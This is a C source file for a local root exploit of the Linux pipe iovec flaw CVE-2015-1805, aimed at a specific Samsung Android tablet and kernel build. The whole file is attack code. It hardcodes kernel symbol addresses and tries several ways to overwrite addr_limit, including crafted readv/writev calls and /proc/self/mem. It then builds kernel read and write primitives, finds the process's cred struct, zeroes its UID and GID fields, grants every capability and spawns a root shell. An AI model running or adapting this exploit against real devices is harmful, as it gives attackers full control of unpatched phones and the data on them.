/*
 * pipe_root.c — CVE-2015-1805 pipe iovec overflow for Android root
 *
 * Target: Samsung SM-T377A, kernel 3.10.9-11788437, Android 6.0.1
 *
 * The vulnerability: pipe_read() and pipe_write() in fs/pipe.c have a
 * bug in the iov_iter advance logic during partial reads/writes.
 * When a pipe buffer wraps and a retry occurs, the iovec position is
 * recalculated incorrectly, allowing read/write past the intended
 * buffer boundary — including into kernel memory.
 *
 * Strategy: Use the pipe bug to overwrite addr_limit to 0xFFFFFFFF,
 * giving us full kernel read/write from userspace. Then directly
 * patch our cred struct for UID 0.
 *
 * Addresses resolved from firmware:
 *   commit_creds        = 0xc0054328
 *   prepare_kernel_cred = 0xc00548e0
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <pthread.h>

#define ADDR_COMMIT_CREDS       0xc0054328
#define ADDR_PREPARE_KERNEL_CRED 0xc00548e0

/* thread_info is at the bottom of the kernel stack (8KB aligned) */
#define THREAD_SIZE 8192

/*
 * On ARM 32-bit kernel 3.10, struct thread_info layout:
 *   offset 0x00: flags
 *   offset 0x04: preempt_count
 *   offset 0x08: addr_limit  (mm_segment_t = unsigned long)
 *   offset 0x0c: task        (struct task_struct *)
 *   ...
 *
 * We want to overwrite addr_limit from 0xBF000000 (USER_DS) to 0xFFFFFFFF
 * to get full kernel access from userspace.
 */
#define ADDR_LIMIT_OFFSET 8

/*
 * On ARM, current_thread_info() = sp & ~(THREAD_SIZE - 1)
 * We can find our own thread_info from the stack pointer.
 */
static unsigned long get_thread_info(void) {
    unsigned long sp;
    __asm__ volatile("mov %0, sp" : "=r"(sp));
    return sp & ~(THREAD_SIZE - 1);
}

/* ========== Pipe exploit (CVE-2015-1805) ========== */

/*
 * The bug is in pipe_iov_copy_to_user / pipe_iov_copy_from_user.
 * When pipe_read does a partial read (because the pipe buffer wraps),
 * it retries with atomic=0. On the retry, if the iovec has been
 * partially consumed, the recalculation of the iovec offset is wrong,
 * causing data to be copied to/from the wrong address.
 *
 * To trigger:
 * 1. Set up a pipe with buffer at a specific fill level
 * 2. Use readv() with an iovec where the first entry is small
 *    and the second entry points to kernel memory
 * 3. The partial read consumes the first iovec entry
 * 4. On retry, the kernel skips the access_ok() check and
 *    copies data to the kernel address in the second iovec
 */

static int pipe_fds[2];
static volatile int writer_done = 0;

static void *pipe_writer_thread(void *arg) {
    int total = (int)(unsigned long)arg;
    char buf[4096];
    memset(buf, 'A', sizeof(buf));
    
    int written = 0;
    while (written < total) {
        int chunk = total - written;
        if (chunk > (int)sizeof(buf)) chunk = sizeof(buf);
        int r = write(pipe_fds[1], buf, chunk);
        if (r <= 0) {
            usleep(1000);
            continue;
        }
        written += r;
    }
    writer_done = 1;
    return NULL;
}

/*
 * Attempt to read from pipe into kernel memory using the iovec bug.
 * 
 * The trick: readv() with iov[0] pointing to a small userspace buffer
 * and iov[1] pointing to a kernel address. If the pipe buffer wraps
 * during the read of iov[0], the retry will advance to iov[1] but
 * skip the access_ok() check.
 */
static int try_pipe_overwrite(unsigned long kernel_addr, void *data, int len) {
    /* Fill pipe to near-capacity (pipe buffer is 16 pages = 65536 bytes) */
    int pipe_capacity = 65536;
    int fill_amount = pipe_capacity - 4096 + len; /* Leave room for wrap */
    
    /* Reset pipe */
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    if (pipe(pipe_fds) < 0) {
        perror("pipe");
        return -1;
    }
    
    /* Make pipe non-blocking for the write end */
    fcntl(pipe_fds[1], F_SETFL, O_NONBLOCK);
    
    /* Fill pipe */
    char fill_buf[4096];
    memset(fill_buf, 'B', sizeof(fill_buf));
    int total_written = 0;
    while (total_written < fill_amount) {
        int chunk = fill_amount - total_written;
        if (chunk > (int)sizeof(fill_buf)) chunk = sizeof(fill_buf);
        int w = write(pipe_fds[1], fill_buf, chunk);
        if (w <= 0) break;
        total_written += w;
    }
    
    /* Drain most of it, leaving just enough to cause a wrap */
    int drain = total_written - 4096;
    char drain_buf[4096];
    int total_drained = 0;
    while (total_drained < drain) {
        int chunk = drain - total_drained;
        if (chunk > (int)sizeof(drain_buf)) chunk = sizeof(drain_buf);
        int r = read(pipe_fds[0], drain_buf, chunk);
        if (r <= 0) break;
        total_drained += r;
    }
    
    /* Now write the data we want to land at kernel_addr */
    write(pipe_fds[1], data, len);
    
    /* Set up iovec for the exploit read */
    char small_buf[32];
    struct iovec iov[2];
    
    /* First iov: small read to consume partial pipe buffer */
    iov[0].iov_base = small_buf;
    iov[0].iov_len = 4096 - 16; /* Sized to trigger buffer wrap */
    
    /* Second iov: kernel address target */
    iov[1].iov_base = (void *)kernel_addr;
    iov[1].iov_len = len;
    
    /* Attempt the exploit read */
    int result = readv(pipe_fds[0], iov, 2);
    
    return result;
}

/* ========== Alternative: Direct addr_limit overwrite ========== */

/*
 * If we can overwrite addr_limit, we can then use read()/write()
 * to arbitrary kernel addresses from userspace.
 */
static int kernel_read(unsigned long addr, void *buf, int len) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    
    /* Write from kernel address to pipe */
    int w = write(pfd[1], (void *)addr, len);
    if (w != len) {
        close(pfd[0]);
        close(pfd[1]);
        return -1;
    }
    
    /* Read from pipe to userspace */
    int r = read(pfd[0], buf, len);
    close(pfd[0]);
    close(pfd[1]);
    return r;
}

static int kernel_write(unsigned long addr, void *buf, int len) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    
    /* Write data to pipe */
    int w = write(pfd[1], buf, len);
    if (w != len) {
        close(pfd[0]);
        close(pfd[1]);
        return -1;
    }
    
    /* Read from pipe into kernel address */
    int r = read(pfd[0], (void *)addr, len);
    close(pfd[0]);
    close(pfd[1]);
    return r;
}

/* ========== Main ========== */

int main(void) {
    printf("=== CVE-2015-1805 Pipe Root Exploit ===\n");
    printf("[*] Target: kernel 3.10.9-11788437\n");
    printf("[*] commit_creds = 0x%08x\n", ADDR_COMMIT_CREDS);
    printf("[*] prepare_kernel_cred = 0x%08x\n", ADDR_PREPARE_KERNEL_CRED);
    printf("[*] Current uid: %d\n", getuid());
    
    /* Get our thread_info address */
    unsigned long ti = get_thread_info();
    printf("[*] thread_info @ 0x%08lx\n", ti);
    printf("[*] addr_limit  @ 0x%08lx\n", ti + ADDR_LIMIT_OFFSET);
    
    /* Test: check current addr_limit value */
    /* On ARM, USER_DS = 0xBF000000 for kernel 3.10 (TASK_SIZE) */
    printf("[*] Expected addr_limit = 0xBF000000 (USER_DS)\n\n");
    
    /* === Method 1: Try pipe iovec overflow === */
    printf("[*] Method 1: Pipe iovec overflow (CVE-2015-1805)\n");
    
    if (pipe(pipe_fds) < 0) {
        perror("pipe");
        return 1;
    }
    
    unsigned long new_limit = 0xFFFFFFFF;
    int ret = try_pipe_overwrite(ti + ADDR_LIMIT_OFFSET, &new_limit, sizeof(new_limit));
    printf("[*] pipe readv returned: %d (errno=%d: %s)\n", ret, errno, strerror(errno));
    
    /* Check if addr_limit was overwritten */
    /* Try to read from a kernel address as a test */
    unsigned long test_val = 0;
    int pfd[2];
    if (pipe(pfd) == 0) {
        int w = write(pfd[1], (void *)0xc0008000, 4);
        if (w == 4) {
            read(pfd[0], &test_val, 4);
            printf("[+] Kernel read test: 0xc0008000 = 0x%08lx\n", test_val);
            printf("[+] addr_limit overwrite SUCCEEDED!\n");
            close(pfd[0]);
            close(pfd[1]);
            goto do_root;
        } else {
            printf("[-] Kernel read failed (w=%d): addr_limit not overwritten\n", w);
        }
        close(pfd[0]);
        close(pfd[1]);
    }
    
    /* === Method 2: Direct readv with large iov_len === */
    printf("\n[*] Method 2: readv with oversized iov targeting thread_info\n");
    
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    if (pipe(pipe_fds) < 0) {
        perror("pipe");
        return 1;
    }
    
    /* Fill pipe completely */
    fcntl(pipe_fds[1], F_SETFL, O_NONBLOCK);
    char fill[4096];
    memset(fill, 0xFF, sizeof(fill));
    /* Put 0xFFFFFFFF pattern at the start */
    unsigned long *fp = (unsigned long *)fill;
    for (int i = 0; i < 1024; i++) fp[i] = 0xFFFFFFFF;
    
    int total = 0;
    while (1) {
        int w = write(pipe_fds[1], fill, sizeof(fill));
        if (w <= 0) break;
        total += w;
    }
    printf("[*] Filled pipe with %d bytes of 0xFF\n", total);
    
    /* Read into a span that includes our thread_info */
    /* The idea: if we can make readv() write past our buffer into thread_info */
    unsigned long stack_buf_addr;
    char stack_buf[4096];
    stack_buf_addr = (unsigned long)stack_buf;
    printf("[*] stack_buf @ 0x%08lx, thread_info @ 0x%08lx\n", stack_buf_addr, ti);
    
    /* If stack_buf is above thread_info (stack grows down on ARM):
     * thread_info is at the bottom of the stack, our local vars are higher.
     * We can't overflow downward from a stack buffer easily. */
    
    /* === Method 3: Try writev to write TO kernel memory === */
    printf("\n[*] Method 3: writev to kernel address\n");
    
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    if (pipe(pipe_fds) < 0) {
        perror("pipe");
        return 1;
    }
    
    /* Try to write our data from kernel address using writev */
    /* This exploits pipe_write's iov handling */
    unsigned long payload = 0xFFFFFFFF;
    struct iovec wiov[2];
    wiov[0].iov_base = fill;
    wiov[0].iov_len = 4000; /* Fill most of a pipe buffer page */
    wiov[1].iov_base = (void *)(ti + ADDR_LIMIT_OFFSET);
    wiov[1].iov_len = 4;
    
    ret = writev(pipe_fds[1], wiov, 2);
    printf("[*] writev returned: %d (errno=%d: %s)\n", ret, errno, strerror(errno));
    
    /* Check if the kernel address was read (indicates access_ok bypass) */
    if (ret > 4000) {
        char check[4];
        /* Drain the pipe to see what was read from kernel memory */
        int dummy_read = read(pipe_fds[0], fill, 4000);
        int kr = read(pipe_fds[0], check, 4);
        if (kr == 4) {
            unsigned long kval = *(unsigned long *)check;
            printf("[+] Read from kernel address: 0x%08lx\n", kval);
        }
    }
    
    /* === Method 4: /proc/self/mem kernel write === */
    printf("\n[*] Method 4: /proc/self/mem write to thread_info\n");
    
    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd >= 0) {
        printf("[+] Opened /proc/self/mem\n");
        /* Try to seek to addr_limit and write */
        if (lseek64(mem_fd, ti + ADDR_LIMIT_OFFSET, SEEK_SET) >= 0) {
            unsigned long val = 0xFFFFFFFF;
            int w = write(mem_fd, &val, sizeof(val));
            printf("[*] Write to addr_limit via /proc/self/mem: %d\n", w);
            if (w == sizeof(val)) {
                printf("[+] addr_limit overwrite via /proc/self/mem!\n");
                close(mem_fd);
                goto do_root;
            }
        }
        close(mem_fd);
    } else {
        printf("[-] Cannot open /proc/self/mem: %s\n", strerror(errno));
    }
    
    printf("\n[-] All pipe-based methods failed.\n");
    printf("[*] This kernel may have CVE-2015-1805 patched.\n");
    return 1;

do_root:
    printf("\n[*] addr_limit = 0xFFFFFFFF — full kernel R/W access!\n");
    printf("[*] Calling commit_creds(prepare_kernel_cred(0))...\n");
    
    /* Now we have kernel R/W. Find our task_struct and patch credentials. */
    /* Read task_struct pointer from thread_info */
    unsigned long task_ptr = 0;
    if (kernel_read(ti + 12, &task_ptr, 4) != 4) { /* offset 0x0c = task */
        printf("[-] Failed to read task pointer\n");
        return 1;
    }
    printf("[+] task_struct @ 0x%08lx\n", task_ptr);
    
    /*
     * In kernel 3.10, task_struct->cred is at a specific offset.
     * We'll scan for our UID (2000 = shell) in the cred structure.
     * struct cred has uid, gid, suid, sgid, euid, egid, fsuid, fsgid
     * all as kuid_t (4 bytes each) starting at a known offset.
     *
     * On 3.10 ARM: cred pointer is at task_struct + ~0x294 (varies).
     * We'll read a range and search for the pattern.
     */
    unsigned char task_data[1024];
    if (kernel_read(task_ptr, task_data, sizeof(task_data)) != (int)sizeof(task_data)) {
        printf("[-] Failed to read task_struct\n");
        return 1;
    }
    
    /* Search for cred pointer: look for uid=2000 pattern in referenced structs */
    unsigned long cred_ptr = 0;
    unsigned long uid_pattern = 2000; /* shell UID */
    
    for (int off = 0x200; off < 0x380; off += 4) {
        unsigned long ptr = *(unsigned long *)(task_data + off);
        if (ptr >= 0xc0000000 && ptr < 0xf0000000) {
            unsigned char cred_data[64];
            if (kernel_read(ptr, cred_data, sizeof(cred_data)) == (int)sizeof(cred_data)) {
                /* Check for uid=2000 repeated pattern (uid, gid, suid, ...) */
                unsigned long *cp = (unsigned long *)cred_data;
                int uid_count = 0;
                for (int i = 1; i < 12; i++) { /* skip atomic_t usage at [0] */
                    if (cp[i] == 2000) uid_count++;
                }
                if (uid_count >= 4) {
                    cred_ptr = ptr;
                    printf("[+] Found cred struct @ 0x%08lx (task+0x%x, uid matches=%d)\n",
                           ptr, off, uid_count);
                    break;
                }
            }
        }
    }
    
    if (!cred_ptr) {
        printf("[-] Could not find cred struct\n");
        printf("[*] Trying alternative: calling commit_creds directly...\n");
        
        /* Alternative: use function pointer call through kernel_read/write
         * We can overwrite a function pointer and trigger it. */
        return 1;
    }
    
    /* Overwrite all UID/GID fields to 0 */
    unsigned long zeros[8] = {0};
    /* In struct cred: uid at offset 4, gid at 8, suid at 12, sgid at 16,
     * euid at 20, egid at 24, fsuid at 28, fsgid at 32 */
    if (kernel_write(cred_ptr + 4, zeros, 32) == 32) {
        printf("[+] Overwrote uid/gid/euid/egid/fsuid/fsgid to 0!\n");
        printf("[+] uid=%d euid=%d\n", getuid(), geteuid());
        
        if (getuid() == 0) {
            printf("\n[!!!] ROOT ACHIEVED!\n");
            /* Also set capabilities */
            unsigned long caps[2] = {0xFFFFFFFF, 0xFFFFFFFF};
            kernel_write(cred_ptr + 40, caps, 8);  /* cap_inheritable */
            kernel_write(cred_ptr + 48, caps, 8);  /* cap_permitted */
            kernel_write(cred_ptr + 56, caps, 8);  /* cap_effective */
            
            printf("[+] Spawning root shell...\n");
            execl("/system/bin/sh", "sh", NULL);
        }
    } else {
        printf("[-] kernel_write to cred struct failed\n");
    }
    
    return 1;
}
